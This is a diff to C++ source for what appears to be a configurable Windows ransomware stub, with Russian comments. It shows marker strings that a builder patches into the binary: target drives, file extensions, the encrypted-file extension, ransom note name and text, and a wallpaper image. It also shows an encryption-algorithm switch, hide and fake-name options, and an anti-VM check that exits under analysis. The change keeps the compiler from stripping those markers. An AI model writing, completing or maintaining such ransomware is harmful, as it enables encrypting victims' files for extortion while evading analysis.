@@ -20,9 +20,6 @@
 // ============================================================
 // ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ С МАРКЕРАМИ ДЛЯ ПАТЧИНГА
 // ============================================================
-// МАРКЕРЫ: каждая переменная начинается с уникальной сигнатуры
-// Библиотека патчинга ищет эти маркеры в бинарнике
-
 #pragma data_seg(".rdata")
 const char MARKER_DRIVES[] = "####DRIVES_START####";
 const char MARKER_EXTS[] = "####EXTS_START####";
@@ -49,7 +46,7 @@ char g_WallpaperBase64[16384] = "";
 char g_WallpaperExt[16] = ".jpg";
 
 // Булевы переменные (хранятся как char)
-char g_Algo = '0';              // '0'=AES, '1'=Salsa20, '2'=RSA
+char g_Algo = '0';
 char g_FakeEnabled = '0';
 char g_HideEnabled = '0';
 char g_AntiVM = '0';
@@ -433,10 +430,24 @@ void drop_notes(const std::vector<std::string>& drives,
 // ГЛАВНАЯ ФУНКЦИЯ
 // ============================================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // ============================================================
+    // ПРИНУДИТЕЛЬНОЕ СОХРАНЕНИЕ МАРКЕРОВ (чтобы компилятор не вырезал)
+    // ============================================================
+    (void)MARKER_DRIVES;
+    (void)MARKER_EXTS;
+    (void)MARKER_EXCLUDE;
+    (void)MARKER_INCLUDE;
+    (void)MARKER_ENC_EXT;
+    (void)MARKER_NOTE_NAME;
+    (void)MARKER_NOTE_CONTENT;
+    (void)MARKER_FAKE_NAME;
+    (void)MARKER_WALL_BASE64;
+    (void)MARKER_WALL_EXT;
+    
     srand(GetTickCount() ^ GetCurrentProcessId());
     
     // Чтение настроек из глобальных переменных
-    int algo = g_Algo - '0';  // Преобразуем char в int
+    int algo = g_Algo - '0';
     
     // Anti-VM
     if (g_AntiVM == '1' && detect_vm()) return 0;
